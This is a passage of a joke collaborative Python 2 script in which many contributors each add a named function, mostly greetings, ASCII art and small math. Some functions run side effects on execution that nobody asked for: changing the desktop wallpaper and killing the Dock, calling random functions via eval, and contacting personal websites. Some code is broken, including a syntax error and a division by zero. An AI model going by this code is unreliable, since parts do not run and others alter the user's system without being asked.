                      "/reddit_wallpaper.jpg\"; };}'")
            os.system("killall Dock")
            return True
    except urllib2.HTTPError:
        print 'There was an error'

    return False


def mrjaeger():
    rand_func = random.choice([obj for name, obj in
                              inspect.getmembers(sys.modules[__name__])
                              if inspect.isfunction(obj)])
    num_args = inspect.getargspec(rand_func)[0]
    args = []
    for i in range(0, len(num_args)):
        args.append("%d" % (random.randint(0, 9001)))
    passed_args = ', '.join(args)
    function_str = "rand_func(%s)" % (passed_args)
    the_result = eval(function_str)
    if isinstance(the_result, (int, float, long)):
        print "Mathematical!"
    else:
        print "Be gone biddies!"


def codesuela(board):
    print json.load(urllib2.urlopen('https://api.4chan.org/%s/0.json' %
                                    (board,)))['threads'][0]['posts'][0]['com']


def pretzilz():
    print ".----------------.  .----------------.  .----------------.  .----------------.  .----------------."
    print "| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |"
    print "| |   ______     | || | _____  _____ | || |  _________   | || |  _________   | || |    _______   | |"
    print "| |  |_   _ \    | || ||_   _||_   _|| || | |  _   _  |  | || | |  _   _  |  | || |   /  ___  |  | |"
    print "| |    | |_) |   | || |  | |    | |  | || | |_/ | | \_|  | || | |_/ | | \_|  | || |  |  (__ \_|  | |"
    print "| |    |  __'.   | || |  | '    ' |  | || |     | |      | || |     | |      | || |   '.___`-.   | |"
    print "| |   _| |__) |  | || |   \ `--' /   | || |    _| |_     | || |    _| |_     | || |  |`\____) |  | |"
    print "| |  |_______/   | || |    `.__.'    | || |   |_____|    | || |   |_____|    | || |  |_______.'  | |"
    print "| |              | || |              | || |              | || |              | || |              | |"
    print "| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |"
    print " '----------------'  '----------------'  '----------------'  '----------------'  '----------------' "
    print "                                   Con amor, from Wisconsin.                                        "


def aturcino():
    pass

def lcynot():
    print 'try out this experiment'

def ferhatelmas():
    print "More forks than stars"

def zonetti():
    print "Open Source FTW"


def hako():
        from datetime import date

        class yllo:
                YLLO = '\033[93m'
                NRML = '\033[0m'

        url = "http://www.hakobaito.co.uk"
        wuzhere = date.fromtimestamp(1366649761)
        print yllo.YLLO
        print "Yellow World! @hako was here! :D", wuzhere
        print "=[],"
        print yllo.NRML
        print url


def pocon():
    import __hello__
    print "And with that, @pocon chimes in late"



def myusuf3():
    module = sys.modules[__name__]
    print 'I love software, and so do these people:'
    for name, obj in inspect.getmembers(module):
        if inspect.isfunction(obj):
            print name
    print 'swag.'


def myeaple():
        new = 2  # Open a new tab, if possible

        num_fn = len([obj for name, obj in
                     inspect.getmembers(sys.modules[__name__])
                     if inspect.isfunction(obj)])

        text = "There%20are%20currently%20" + \
               (str)(num_fn) + "%20functions%20in%20socode.py"
        hashtags = "socode"
        socode_url = "https%3A%2F%2Fgithub.com%2Fsricola%2Fsocode"

        print "Number of functions in socode.py = " + (str)(num_fn)

        # Tweet the number of functions in socode.py
        url = "https://twitter.com/intent/tweet?url=" + socode_url + "&text=" \
            + text + "&hashtags=" + hashtags

        webbrowser.open(url, new=new)


def reksy():
        print "I thought Python was like the snake game?"


def vitovan():
    print "Only after disaster can we be resurrected..."
    print "It's only after you've lost every thing that " \
          "you're free to do anything..."


def NerdyTherapist():
    print "What am I doing? I should be working on my Bachelor thesis..."


def calvcoll(rs):
    if rs == 1024:
        print "You have struck the gold mine!"
        print "Well done for getting the 2^10"
        print "--Love from your ginger friend, Calv"


def bheesham():
        print "Hello world! - Bheesham"


def markembling(talkative=True):
    """Generate a random colour as a tuple (R,G,B) and optionally print it"""
    colour = (random.randint(0, 255),
              random.randint(0, 255),
              random.randint(0, 255))
    if talkative:
        print "Your randomly created colour is: #%x%x%x" % colour
    return colour


def joshryandavis():
    for i in range(0, 72):
        print 'Around the world, around the world'


def mainliner(n, sum_xy, sum_x, sum_y, sum_xx, sum_yy):
    numerator = (n * sum_xy - sum_x * sum_y)
    denominator = math.sqrt(n * sum_xx - sum_x * sum_x) * \
        math.sqrt(n * sum_yy - sum_y * sum_y)
    similarity = numerator / denominator
    return similarity


def awesoham(n):
    # As x increases the output approaches e. What's e, you ask?
    # See en.wikipedia.org/wiki/E_(mathematical_constant)
    for x in range(n):
        return (x + 1) ** (x + 1) / x ** x - x ** x / (x - 1) ** (x - 1)


def ncerminara(n):
    phi = (1 + 5 ** 0.5) / 2
    return int(round((phi ** n - (1 - phi) ** n) / 5 ** 0.5))

def sirmmo():
    print "To be or not to be that is the question..."
    now = time.time
    return [x for x in range(1000) if now / x = 7 ]

def rafkhan():
    print socode_source


def nazgu1():
    urllib2.urlopen('http://dziurdzia.eu/').read()
    urllib2.urlopen('https://cycloo.pl').read()
    print 'Hello World! :)'


def dlutcat():
    print "I have developed a Pinterest-like site focus " \
          "on travelling: kantuban.com"
    print "Hope you like it!"


def yeco():
    import this
    import antigravity


def erictherobot():
    print "01001001 00100000 01110111 01100001 01101110 01110100 00100000 01110100 01101111 00100000 01100100 01101111 00100000 01110011 01101111 01101101 01100101 01110100 01101000 01101001 01101110 01100111 00100000 01110011 01101001 01100111 01101110 01101001 01100110 01101001 01100011 01100001 01101110 01110100 00100000 01100001 01101110 01100100 00100000 01101101 01100101 01100001 01101110 01101001 01101110 01100111 01100110 01110101 01101100 00100000 01110111 01101001 01110100 01101000 00100000 01111001 01101111 01110101 00101110 00100000 01001001 00100111 01101101 00100000 01101001 01101110 00100000 01010111 01101001 01101100 01101100 01101001 01100001 01101101 01110011 01100010 01110101 01110010 01100111 00101100 00100000 01101100 01100101 01110100 00100111 01110011 00100000 01101101 01100101 01100101 01110100 01110101 01110000 00101110 00100000 01100101 01110010 01101001 01100011 01110100 01101000 01100101 01110010 01101111 01100010 01101111 01110100 01000000 01100111 01101101 01100001 01101001 01101100 00101110 01100011 01101111 01101101 00100000 01000000 01100101 01110010 01101001 01100011 01110100 01101000 01100101 01110010 01101111 01100010 01101111 01110100"


def mapleray():
    print "It's awesome~~~"
    print "Hello World , This is mapleray"
    f = lambda x: x and x * f(x - 1) or 1
    print f(199)


def romibuzi():
    print "From Paris with love !"


def zenware(data):
    for item in data:
        print(item)


def rickyc():
  return "1LZNMnc2hHS9LJfJPRb7FmBhhKyKQCpWFx"



# Please consider creating your function
# some random place between two other
# functions instead of right here.
# This will give your commit a much
# better chance of getting merged.

# Ironically, the commit adding ^ gave me
# a merge conflict whilst trying to
# resolve merge conflicts :P - pocon
# Sorry - daniel-dressler
if __name__ == "__main__":
    antonaut()  # DOUBLE-RAINBOW! Soo cool
    ryannolson()
    hmason()
    seripap("deleting ", 1, "......")
    rjwebb(5)
    erictherobot()
    sikado()
    dlad()
    starefossen()
    lbalceda(42)
    heinzf(False)  # this thing makes it hard to make sure stuff works,
                   # doesn't it?
    uiri()  # Can I go first unless you're going to modify the file?
    dpayne()
    _3boll()
    arkokoley()
    brandybuck()
    drewcrawford()
    awesoham(100)
    dmercer(42)
    ryanseys()
    devonbarrett()
    justinrsmith()
    jpadilla()
    mmay()
    evinugur()
    JesseAldridge()
    rafkhan()
    bencooling()
    perimosocordiae()
    sricola()
    kisom()
    rixx()
    ncammarata()
    eddotman()
    myusuf3()
    mergesort()
    ferhatelmas()
    julio()
    gardaud(prezjordan)
    GeneralZero()
    tcr()
    mrjaeger()
    jhgaylor()
    henghonglee()
    taylorlapeyre()
    djrausch()
    jeffjose()
    agoebel()
    sirmmo()
    payomdousti()
    ZackMullaly()
    cyclo()
    binary132()
    MikeGrace()
    nckrdrgz('May')
    sfrnld()
    yuvadm()
    kghose()
    doctorpangloss()
    thisjustin('open the pod bay doors')
    chrisgw()
    dogukantufekci()
    fmazon3()
    bprater()
    eternalmatt()
    charliegroll()
    PiersonBro()
    ankushsachdeva()
    aniketpant()
    umurgdk()
    NerdyTherapist()
    jontonsoup()
    prezjordan()
    joshryandavis()
    nazgu1()
    shuhaowu()
    hutattedonmyarm()
    chewxy()
    pretzilz()
    theabrad()
    rburgosnavas('ANNIHILATE!!!!')
    mikemiles86()
    markembling()
    satshabad()
    ondrae()
    hazirguo()
    chris911()
    doboy(doboy)
    monsdar()
    ngokevin('ngokevin.com')
    jessex()
    rightfold()
    lax()
    nathanathan(lambda: shazeline("sricola"), yays=["nathanathan"])
    hako()
    thisishugo()
    lcynot()
    danielnr()
    ncerminara(3)
    spratt()
    mufid()
    aturcino()
    windspy()
    samlabs821()
    vellamike(10)
    alisnic(random.randint(1, 1024))
    zonetti()
    pocon()
    bheesham()
    wmill()
    calvcoll(random.randint(1, 1024))
    harshavardhana('E,9)oF*2M7/c~>')
    vitovan()
    dlutcat()
    romibuzi()
    drostie()
    yeco()
    mapleray()
    zenware({"Hello, from USA!", "Enjoy social coding. :)"})
    rickyc()

    # If you add a call to your function here you will
    # hit a merge conflict. Instead if you add your
    # call some place random wihin the list or at the
    # bottom of someone else's function then your
    # commit should automerge. Please consider this
    # ---------------------------------------------
    # as per instructed, please leave this as the final function
    lafin()
